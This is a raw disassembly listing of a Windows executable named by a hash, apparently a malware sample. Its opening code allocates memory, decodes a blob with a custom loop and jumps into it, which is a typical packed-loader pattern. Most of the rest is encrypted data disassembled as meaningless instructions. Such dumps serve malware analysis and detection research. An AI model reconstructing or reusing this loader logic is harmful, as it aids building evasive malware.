
35d07d45e19bd1deddae183432e817172e3f8b746918c55d503cf97622d5f065.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x4291e8
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x4291e0
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429018
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429014
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429010
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x42902c
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x429040
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429044
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x42904c
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x42911c
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291a8
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x429180
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429150
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429128
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  edx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    eax,DWORD PTR [esp+0x10]
  4111a9:	mov    ecx,DWORD PTR [esp+0x14]
  4111ad:	add    eax,ecx
  4111af:	mov    DWORD PTR [esp+0x10],eax
  4111b3:	shr    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    ecx,eax
  4111bb:	shr    ecx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,ecx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	mov    ecx,DWORD PTR [esp+0x24]
  4111d6:	add    bl,dl
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x48],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x70],0x0
  41120b:	mov    DWORD PTR [ebp-0x60],0x0
  411212:	mov    DWORD PTR [ebp-0x8],0x0
  411219:	mov    DWORD PTR [ebp-0x6c],0x0
  411220:	mov    DWORD PTR [ebp-0x68],0x0
  411227:	mov    DWORD PTR [ebp-0x14],0x0
  41122e:	mov    DWORD PTR [ebp-0x4c],0x0
  411235:	mov    DWORD PTR [ebp-0x10],0x0
  41123c:	mov    DWORD PTR [ebp-0x58],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x5c],0x0
  411251:	mov    DWORD PTR [ebp-0x30],0x0
  411258:	mov    DWORD PTR [ebp-0x54],0x0
  41125f:	mov    DWORD PTR [ebp-0x2c],0x0
  411266:	mov    DWORD PTR [ebp-0x50],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x429214
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429218
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x42921c
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429220
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x429204
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429208
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x42920c
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429210
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x429212
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	lea    eax,[ebp-0x10]
  4112ce:	push   eax
  4112cf:	push   0x4291f0
  4112d4:	call   DWORD PTR ds:0x429008
  4112da:	test   eax,eax
  4112dc:	je     0x411338
  4112de:	lea    ecx,[ebp-0x40]
  4112e1:	push   ecx
  4112e2:	lea    edx,[ebp-0x10]
  4112e5:	push   edx
  4112e6:	call   DWORD PTR ds:0x429000
  4112ec:	test   eax,eax
  4112ee:	je     0x411338
  4112f0:	push   0x0
  4112f2:	push   0x0
  4112f4:	push   0x0
  4112f6:	call   DWORD PTR ds:0x429034
  4112fc:	mov    DWORD PTR [ebp-0x14],eax
  4112ff:	mov    eax,DWORD PTR [ebp-0x10]
  411302:	add    eax,0x1
  411305:	mov    DWORD PTR [ebp-0x10],eax
  411308:	push   0x14
  41130a:	push   0x0
  41130c:	mov    ecx,DWORD PTR [ebp-0x14]
  41130f:	push   ecx
  411310:	call   DWORD PTR ds:0x429030
  411316:	lea    edx,[ebp-0x50]
  411319:	push   edx
  41131a:	push   0x0
  41131c:	push   0x0
  41131e:	push   0x0
  411320:	mov    eax,DWORD PTR [ebp-0x50]
  411323:	push   eax
  411324:	call   DWORD PTR ds:0x429004
  41132a:	push   0x0
  41132c:	push   0x0
  41132e:	mov    ecx,DWORD PTR [ebp-0x14]
  411331:	push   ecx
  411332:	call   DWORD PTR ds:0x429048
  411338:	call   DWORD PTR ds:0x429028
  41133e:	mov    DWORD PTR [ebp-0x2c],eax
  411341:	movzx  edx,WORD PTR [ebp-0x2c]
  411345:	cmp    edx,0x539
  41134b:	jne    0x41137c
  41134d:	mov    DWORD PTR [ebp-0x14],0xe0d
  411354:	lea    eax,[ebp-0x28]
  411357:	push   eax
  411358:	call   DWORD PTR ds:0x429024
  41135e:	mov    DWORD PTR [ebp-0x60],eax
  411361:	mov    DWORD PTR [ebp-0x54],0x3a
  411368:	mov    BYTE PTR [ebp-0x34],0x0
  41136c:	mov    DWORD PTR [ebp-0x8],0xee1fc862
  411373:	mov    DWORD PTR [ebp-0x68],0x10d93f
  41137a:	jmp    0x411391
  41137c:	mov    BYTE PTR ds:0x444a58,0x0
  411383:	mov    BYTE PTR ds:0x42cb88,0x0
  41138a:	mov    BYTE PTR ds:0x442b18,0x0
  411391:	mov    DWORD PTR [ebp-0x2c],0x410000
  411398:	push   DWORD PTR ds:0x429024
  41139e:	pop    edx
  41139f:	mov    DWORD PTR [ebp-0x6c],edx
  4113a2:	lea    ecx,[ebp-0x40]
  4113a5:	push   ecx
  4113a6:	mov    edx,DWORD PTR [ebp-0x60]
  4113a9:	push   edx
  4113aa:	call   DWORD PTR ds:0x429020
  4113b0:	mov    DWORD PTR [ebp-0x44],eax
  4113b3:	push   DWORD PTR [ebp-0x30]
  4113b6:	push   0x1000
  4113bb:	mov    eax,DWORD PTR [ebp-0x14]
  4113be:	add    eax,0x23
  4113c1:	add    eax,0x23
  4113c4:	push   eax
  4113c5:	xor    eax,eax
  4113c7:	push   eax
  4113c8:	mov    ecx,DWORD PTR [ebp-0x44]
  4113cb:	call   ecx
  4113cd:	push   eax
  4113ce:	pop    ecx
  4113cf:	mov    DWORD PTR [ebp-0x4],ecx
  4113d2:	mov    eax,DWORD PTR [ebp-0x68]
  4113d5:	sub    eax,0xdae0b
  4113da:	mov    DWORD PTR [ebp-0x68],eax
  4113dd:	cmp    DWORD PTR [ebp-0x4],0x0
  4113e1:	jne    0x4113ea
  4113e3:	mov    BYTE PTR ds:0x442b18,0x0
  4113ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ed:	add    ecx,DWORD PTR [ebp-0x14]
  4113f0:	mov    edx,DWORD PTR [ebp-0x8]
  4113f3:	mov    DWORD PTR [ecx],edx
  4113f5:	mov    eax,DWORD PTR [ebp-0x4]
  4113f8:	add    eax,DWORD PTR [ebp-0x54]
  4113fb:	mov    DWORD PTR [ebp-0x5c],eax
  4113fe:	mov    ecx,DWORD PTR ds:0x429020
  411404:	mov    DWORD PTR [ebp-0x4c],ecx
  411407:	mov    edx,DWORD PTR [ebp-0x4]
  41140a:	add    edx,DWORD PTR [ebp-0x14]
  41140d:	mov    eax,DWORD PTR [ebp+0x8]
  411410:	mov    DWORD PTR [edx+0x4],eax
  411413:	mov    ecx,DWORD PTR [ebp-0x4]
  411416:	add    ecx,DWORD PTR [ebp-0x14]
  411419:	mov    DWORD PTR [ebp-0xc],ecx
  41141c:	cmp    DWORD PTR [ebp-0x68],0x0
  411420:	jbe    0x41143d
  411422:	mov    edx,DWORD PTR [ebp-0xc]
  411425:	push   edx
  411426:	mov    eax,DWORD PTR [ebp-0x14]
  411429:	push   eax
  41142a:	mov    ecx,DWORD PTR [ebp-0x2c]
  41142d:	add    ecx,DWORD PTR [ebp-0x68]
  411430:	push   ecx
  411431:	mov    edx,DWORD PTR [ebp-0x4]
  411434:	push   edx
  411435:	call   0x411170
  41143a:	add    esp,0x10
  41143d:	cmp    DWORD PTR [ebp-0x5c],0x0
  411441:	je     0x411454
  411443:	push   DWORD PTR [ebp-0x4c]
  411446:	push   DWORD PTR [ebp-0x6c]
  411449:	mov    edx,DWORD PTR [ebp-0x5c]
  41144c:	push   eax
  41144d:	jmp    edx
  41144f:	jmp    0x422f29
  411454:	mov    eax,DWORD PTR [ebp+0x8]
  411457:	mov    DWORD PTR [ebp-0x18],eax
  41145a:	rol    dl,1
  41145c:	or     eax,0x4095662a
  411461:	mov    ebp,0x3e2b83d
  411466:	inc    ebp
  411467:	push   edi
  411468:	or     al,BYTE PTR [ecx+edx*8]
  41146b:	aaa    
  41146c:	out    dx,eax
  41146d:	mov    eax,0x2b21726
  411472:	or     al,al
  411474:	int3   
  411475:	dec    esp
  411476:	ficomp WORD PTR [esi-0x31]
  411479:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41147b:	out    0x6f,al
  41147d:	pop    ss
  41147e:	xchg   BYTE PTR [ecx-0x8c2ecc1],bl
  411484:	std    
  411485:	retf   
  411486:	jns    0x41144a
  411488:	loope  0x41149a
  41148a:	scas   eax,DWORD PTR es:[di]
  41148c:	imul   esp,DWORD PTR [ebp-0x19],0x60
  411490:	mov    esp,0x1b8fc9b2
  411495:	push   ebx
  411496:	mov    cl,0x86
  411498:	cdq    
  411499:	cmc    
  41149a:	loopne 0x41148b
  41149c:	mov    al,ds:0x68388aed
  4114a1:	test   BYTE PTR [ecx-0x11],dl
  4114a4:	test   BYTE PTR [edi-0x3784e5e8],cl
  4114aa:	mov    esi,0x1566c66c
  4114af:	loope  0x411456
  4114b1:	dec    ebx
  4114b2:	add    esi,ebp
  4114b4:	int3   
  4114b5:	int3   
  4114b6:	or     BYTE PTR [ebp+0x31],ah
  4114b9:	mov    DWORD PTR [eax],edx
  4114bb:	or     al,0xf1
  4114bd:	out    dx,eax
  4114be:	imul   eax,DWORD PTR [ebp-0x6abf65b5],0x51046655
  4114c8:	jbe    0x411470
  4114ca:	imul   DWORD PTR [esp+eax*1-0xa]
  4114ce:	icebp  
  4114cf:	jp     0x411480
  4114d1:	test   al,0xc4
  4114d3:	inc    esi
  4114d4:	(bad)  
  4114d5:	mov    edi,DWORD PTR [edx+0x12ce9d53]
  4114db:	mov    edx,0x85b9645f
  4114e0:	leave  
  4114e1:	or     eax,0x4877deb6
  4114e6:	push   ebx
  4114e7:	and    BYTE PTR [ebp-0x75],dh
  4114ea:	xor    eax,0x9dda7f1d
  4114ef:	test   al,0xb6
  4114f1:	sub    eax,0xddccf32e
  4114f6:	sub    BYTE PTR [ebx+ebx*1],cl
  4114f9:	fwait
  4114fa:	loopne 0x411559
  4114fc:	xchg   ecx,eax
  4114fd:	and    bh,dh
  4114ff:	test   eax,0x45241af8
  411504:	jecxz  0x4114ac
  411506:	sar    BYTE PTR [edx+0x1808f578],0x58
  41150d:	fild   WORD PTR [edx-0x56]
  411510:	test   BYTE PTR [edi],0xf7
  411513:	inc    esi
  411514:	sbb    ah,ah
  411516:	into   
  411517:	call   ebx
  411519:	adc    al,0xf6
  41151b:	jbe    0x411564
  41151d:	mov    ecx,DWORD PTR [ebx+0x4191ab35]
  411523:	mov    ds:0x67b4be17,eax
  411528:	(bad)  
  411529:	xchg   esi,eax
  41152a:	mov    eax,ds:0x5de7ddb5
  41152f:	sub    bl,BYTE PTR ds:0xd5ae4dd5
  411535:	nop
  411536:	fistp  WORD PTR ds:0x21cacd46
  41153c:	aam    0x5
  41153e:	or     eax,0x732cc76f
  411543:	call   DWORD PTR [ebx]
  411545:	rcl    DWORD PTR [eax-0x58],0xff
  411549:	and    al,dh
  41154b:	xor    ah,BYTE PTR [ebx+0x55]
  41154e:	sti    
  41154f:	addr16 aam 0x3c
  411552:	sbb    ebp,DWORD PTR ds:0x183a16ca
  411558:	and    ebx,ebp
  41155a:	push   cs
  41155b:	and    bl,BYTE PTR [ebx]
  41155d:	cmp    ah,bh
  41155f:	jp     0x4114e4
  411561:	mov    esi,cs
  411563:	clc    
  411564:	loop   0x411520
  411566:	pop    eax
  411567:	jbe    0x4114f4
  411569:	rcr    ebp,cl
  41156b:	je     0x4115e3
  41156d:	repz neg DWORD PTR [ecx]
  411570:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411571:	cmp    ch,ch
  411573:	bound  sp,DWORD PTR [edx+edx*4-0x2b]
  411578:	mov    al,0x86
  41157a:	loop   0x4115dc
  41157c:	and    eax,DWORD PTR [esi+edx*2+0x629fd1af]
  411583:	stos   DWORD PTR es:[edi],eax
  411584:	gs stos BYTE PTR es:[edi],al
  411586:	ja     0x411556
  411588:	jmp    0x4115c0
  41158a:	sbb    BYTE PTR ds:0x3fc01c52,ch
  411590:	xchg   esp,eax
  411591:	fwait
  411592:	cmp    cl,bl
  411594:	or     DWORD PTR [ecx+0x24850574],0xffffffe3
  41159b:	bound  edx,QWORD PTR [ebx-0x4a]
  41159e:	dec    edi
  41159f:	dec    esi
  4115a0:	and    eax,0x7fe57748
  4115a5:	in     al,dx
  4115a6:	add    BYTE PTR [ebx],0x8a
  4115a9:	(bad)  
  4115aa:	xor    eax,0x6fb740e6
  4115af:	(bad)  
  4115b1:	lock retf 
  4115b3:	shr    BYTE PTR [ecx+0x51],1
  4115b6:	loope  0x4115f2
  4115b8:	lds    ecx,FWORD PTR [ebp+0x49]
  4115bb:	jns    0x411554
  4115bd:	mov    ebx,0x347144f4
  4115c2:	inc    ebx
  4115c3:	loopne 0x411583
  4115c5:	inc    eax
  4115c6:	test   DWORD PTR [eax-0xd],0x3a8ae0a5
  4115cd:	popf   
  4115ce:	push   ebx
  4115cf:	imul   ecx,DWORD PTR [eax],0xb
  4115d2:	cmp    esp,DWORD PTR [ebx-0x6c571cfc]
  4115d8:	sub    cl,dh
  4115da:	(bad)  
  4115db:	or     al,0xbd
  4115dd:	and    eax,0xec0d605
  4115e2:	jne    0x411642
  4115e4:	cmp    dh,BYTE PTR [ebp-0xb9e71f1]
  4115ea:	sbb    dh,bh
  4115ec:	cmp    ecx,DWORD PTR [ebx-0x5dccbc98]
  4115f2:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4115f4:	mov    ebx,0x9b3cca12
  4115f9:	aas    
  4115fa:	xchg   ebx,eax
  4115fb:	cmp    BYTE PTR [ecx],ah
  4115fd:	lsl    ecx,sp
  411600:	mov    ax,ds:0xa681e67d
  411606:	out    dx,al
  411607:	push   ds
  411608:	adc    esp,DWORD PTR [ebp+esi*4+0x0]
  41160c:	cmp    DWORD PTR [ecx+0x74],0xebda4af5
  411613:	daa    
  411614:	js     0x4115cf
  411616:	fild   DWORD PTR [esi-0x5b1e5540]
  41161c:	and    BYTE PTR [ebx],ch
  41161e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41161f:	lods   al,BYTE PTR ds:[esi]
  411620:	jbe    0x41163f
  411622:	mov    edi,0xc47b534d
  411627:	ror    DWORD PTR [ecx+0x0],0x1e
  41162b:	(bad)  
  41162c:	es xchg ecx,eax
  41162e:	add    ebx,DWORD PTR [ebx+0x14]
  411631:	and    al,BYTE PTR [ebx+esi*1-0x4c31a1a6]
  411638:	cmc    
  411639:	inc    edx
  41163a:	and    DWORD PTR [ebp-0x78],eax
  41163d:	sub    dl,dl
  41163f:	xor    al,al
  411641:	pop    ecx
  411642:	mov    bh,0xa9
  411644:	cmp    dh,BYTE PTR [edi+0x74c147f8]
  41164a:	xlat   BYTE PTR ds:[ebx]
  41164b:	or     al,0x97
  41164d:	fsub   DWORD PTR [ebx+0x1f]
  411650:	push   es
  411651:	mov    ecx,0x416b53c
  411656:	popa   
  411657:	ret    0x9af8
  41165a:	cld    
  41165b:	std    
  41165c:	hlt    
  41165d:	mov    gs,WORD PTR [ebp+0x46]
  411660:	push   es
  411661:	pop    esp
  411662:	pop    ebp
  411663:	ror    DWORD PTR [ebp+0x78],cl
  411666:	xchg   ebx,eax
  411667:	xchg   ecx,eax
  411668:	fiadd  WORD PTR [ebx-0x19]
  41166b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41166c:	mov    dh,0xeb
  41166e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41166f:	outs   dx,DWORD PTR ds:[esi]
  411670:	pop    ds
  411671:	mov    es,WORD PTR ds:0xc41c295
  411677:	clc    
  411678:	aad    0x58
  41167a:	test   al,0xe5
  41167c:	inc    eax
  41167d:	mov    esp,0x64c502cb
  411682:	mov    ds:0x8823c8c8,al
  411687:	jmp    0x411696
  411689:	fcomp  DWORD PTR [edx]
  41168b:	xchg   esi,eax
  41168c:	(bad)  
  41168d:	and    DWORD PTR [eax-0x32],eax
  411690:	rcl    DWORD PTR [eax-0x3fdf83b4],0x8e
  411697:	jp     0x411677
  411699:	xchg   BYTE PTR [edx-0x282960e],al
  41169f:	loope  0x411630
  4116a1:	mov    dh,dh
  4116a3:	push   ebp
  4116a4:	cmp    ebp,DWORD PTR [ecx]
  4116a6:	dec    esi
  4116a7:	dec    ecx
  4116a8:	add    al,dh
  4116aa:	call   0x3db1854
  4116af:	mov    BYTE PTR [edx+0x343cea71],ah
  4116b5:	in     al,0xb3
  4116b7:	sub    eax,0xaa3c1198
  4116bc:	mov    BYTE PTR [ebx+0x2],ah
  4116bf:	push   edx
  4116c0:	call   0x4c835216
  4116c5:	push   esp
  4116c6:	mov    edi,0x64558eb0
  4116cb:	adc    al,0x90
  4116cd:	aas    
  4116ce:	lea    ebx,[esi]
  4116d0:	pop    DWORD PTR [ecx+0x65]
  4116d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116d4:	inc    edx
  4116d5:	pushf  
  4116d6:	fistp  WORD PTR ds:[ebx+0x43178c42]
  4116dd:	fwait
  4116de:	xor    eax,DWORD PTR [edi]
  4116e0:	add    BYTE PTR [ecx-0x56],ah
  4116e3:	add    bh,BYTE PTR [ebx-0x180caa5e]
  4116e9:	int3   
  4116ea:	ds shl ch,0x43
  4116ee:	jo     0x411727
  4116f0:	retf   
  4116f1:	test   BYTE PTR [ebx+eax*4-0x53bdc01a],bh
  4116f8:	std    
  4116f9:	xchg   DWORD PTR [ecx],eax
  4116fb:	retf   
  4116fc:	std    
  4116fd:	mov    esp,0xf84b31b4
  411702:	sahf   
  411703:	jne    0x41177c
  411705:	add    bh,BYTE PTR [esp+eax*4]
  411708:	mov    BYTE PTR [esi],ah
  41170a:	jmp    0x98f4:0x44273957
  411711:	dec    esi
  411712:	cmp    edx,DWORD PTR [edi]
  411714:	sbb    eax,ebp
  411716:	(bad)  
  411717:	(bad)  
  411718:	stc    
  411719:	sub    dl,0x5b
  41171c:	gs and al,0xf4
  41171f:	out    0x97,al
  411721:	pop    edx
  411722:	jl     0x41179d
  411724:	or     al,0x45
  411726:	(bad)  
  411727:	cmc    
  411728:	js     0x4116cb
  41172a:	pop    ebx
  41172b:	outs   dx,BYTE PTR ds:[esi]
  41172c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41172d:	and    BYTE PTR [ebx+0x3445228e],bl
  411733:	outs   dx,BYTE PTR ds:[esi]
  411734:	imul   esi,DWORD PTR [ecx],0x66
  411737:	and    ebx,DWORD PTR [esi-0x13]
  41173a:	cmp    DWORD PTR [eax],edi
  41173c:	mov    eax,ds:0xbe1102e0
  411741:	lods   eax,DWORD PTR ds:[esi]
  411742:	loop   0x41173c
  411744:	inc    edi
  411745:	mov    ds:0xcbc73abf,eax
  41174a:	add    dh,BYTE PTR [ecx]
  41174c:	imul   esp,DWORD PTR [ebp-0x4cb1de79],0x3fa3b066
  411756:	xchg   ah,cl
  411758:	push   0xffffff9e
  41175a:	(bad)  
  41175b:	jecxz  0x4116ec
  41175d:	and    esi,DWORD PTR [edx+0x2223d514]
  411763:	and    BYTE PTR [ebx-0x5543db87],0xc6
  41176a:	das    
  41176b:	sub    ah,bh
  41176d:	std    
  41176e:	mov    esi,0xc54f87bd
  411773:	rcr    BYTE PTR [esp+eax*2+0x48260a6d],0x2e
  41177b:	enter  0xeeb6,0xf9
  41177f:	lock loopne 0x4117fe
  411782:	cwde   
  411783:	xor    DWORD PTR [esi+0x6f],ecx
  411786:	stc    
  411787:	iret   
  411788:	xchg   ebp,eax
  411789:	jb     0x4117f8
  41178b:	cmp    bh,BYTE PTR [edi+0x20fe1c82]
  411791:	(bad)  
  411792:	pop    edx
  411793:	and    BYTE PTR [ebp-0x1003ffb9],0xa9
  41179a:	add    bh,BYTE PTR [eax]
  41179c:	mov    esp,0x3b4320c6
  4117a1:	pop    esi
  4117a2:	xor    al,0x47
  4117a4:	fwait
  4117a5:	sbb    eax,0x1b2eda06
  4117aa:	add    al,0x7e
  4117ac:	pushf  
  4117ad:	jl     0x411756
  4117af:	xor    ebx,DWORD PTR [eax-0x31861e70]
  4117b5:	gs out dx,al
  4117b7:	xlat   BYTE PTR ds:[ebx]
  4117b8:	(bad)  
  4117b9:	(bad)  
  4117ba:	les    edx,FWORD PTR [ebp-0x4cc167a]
  4117c0:	adc    dh,al
  4117c2:	sbb    dl,BYTE PTR [ecx-0x541b7e37]
  4117c8:	cwde   
  4117c9:	mov    ebx,0xcc15511b
  4117ce:	cdq    
  4117cf:	inc    eax
  4117d0:	pop    edx
  4117d1:	(bad)  
  4117d2:	dec    esp
  4117d3:	adc    ecx,DWORD PTR [ecx-0x31]
  4117d6:	pop    esp
  4117d7:	dec    eax
  4117d8:	cmp    BYTE PTR [esi+0x77],0x9a
  4117dc:	sbb    DWORD PTR [ebp+0x5],ecx
  4117df:	mov    edx,0x90cd267
  4117e4:	pusha  
  4117e5:	cmp    esp,DWORD PTR [edx-0x6527774e]
  4117eb:	mov    eax,0x820074dc
  4117f0:	dec    esp
  4117f1:	in     al,0x8
  4117f3:	inc    ebx
  4117f4:	cwde   
  4117f5:	lods   al,BYTE PTR ds:[esi]
  4117f6:	sub    DWORD PTR [ebx+eax*2-0x1ff065ea],edx
  4117fd:	xchg   ebp,eax
  4117fe:	sbb    DWORD PTR [ebp-0x3899db85],edx
  411804:	add    BYTE PTR [ecx],dl
  411806:	fs jae 0x41183e
  411809:	sbb    BYTE PTR [edi+0x1f5ac378],0x2f
  411810:	add    esp,DWORD PTR [ecx]
  411812:	mov    ds:0xb589edac,eax
  411817:	push   0xb1355307
  41181c:	mov    al,ds:0x563cf67d
  411821:	shl    BYTE PTR [eax+0x42fb5d77],cl
  411827:	pop    es
  411828:	popf   
  411829:	mov    dl,0xc5
  41182b:	mov    edx,0xccbb3fd4
  411830:	(bad)
  411833:	xlat   BYTE PTR ds:[ebx]
  411834:	retf   0xd475
  411837:	loope  0x411810
  411839:	and    eax,0x3c3312da
  41183e:	mov    eax,ds:0x28733888
  411843:	loopne 0x4117f8
  411845:	scas   eax,DWORD PTR es:[edi]
  411846:	adc    bl,ch
  411848:	pusha  
  411849:	pop    eax
  41184a:	or     dh,cl
  41184c:	xchg   esi,eax
  41184d:	jge    0x411842
  41184f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411850:	pand   mm1,mm1
  411853:	sti    
  411854:	das    
  411855:	retf   
  411856:	mov    eax,ds:0x32ecfa5e
  41185b:	mov    ch,0x38
  41185d:	mov    BYTE PTR [ebp-0x43],ah
  411860:	les    esp,FWORD PTR [esp+edi*1+0x3e]
  411864:	inc    ecx
  411865:	pop    esi
  411866:	call   0x5ddeca4d
  41186b:	pop    ebx
  41186c:	inc    eax
  41186d:	jmp    0x5bc538a1
  411872:	pop    ss
  411873:	mov    al,BYTE PTR ds:[esi-0xde73da3]
  41187a:	push   cs
  41187b:	adc    eax,0x8863eb9a
  411880:	aam    0x80
  411882:	cmc    
  411883:	out    0xd7,al
  411885:	dec    ebp
  411886:	sbb    al,0x94
  411888:	adc    al,0x8c
  41188a:	shl    DWORD PTR [edx],1
  41188c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41188d:	enter  0x61f,0xad
  411891:	shl    BYTE PTR [ebx],0xe0
  411894:	imul   BYTE PTR [esi+0x5310fc97]
  41189a:	mov    BYTE PTR [eax-0x26],dl
  41189d:	into   
  41189e:	mov    dh,0x4f
  4118a0:	sub    ah,dh
  4118a2:	push   es
  4118a3:	sub    al,0x1b
  4118a5:	fsubrp st(7),st
  4118a7:	loop   0x4118c1
  4118a9:	push   eax
  4118aa:	cmc    
  4118ab:	xor    edi,edi
  4118ad:	pop    eax
  4118ae:	bound  eax,QWORD PTR [edx+0x2ce13401]
  4118b4:	call   0xd9cd:0xb221ec34
  4118bb:	sub    eax,0xfcfb83ee
  4118c0:	jmp    0x75fd:0xfa14d800
  4118c7:	test   al,0x7f
  4118c9:	push   ss
  4118ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118cb:	(bad)  
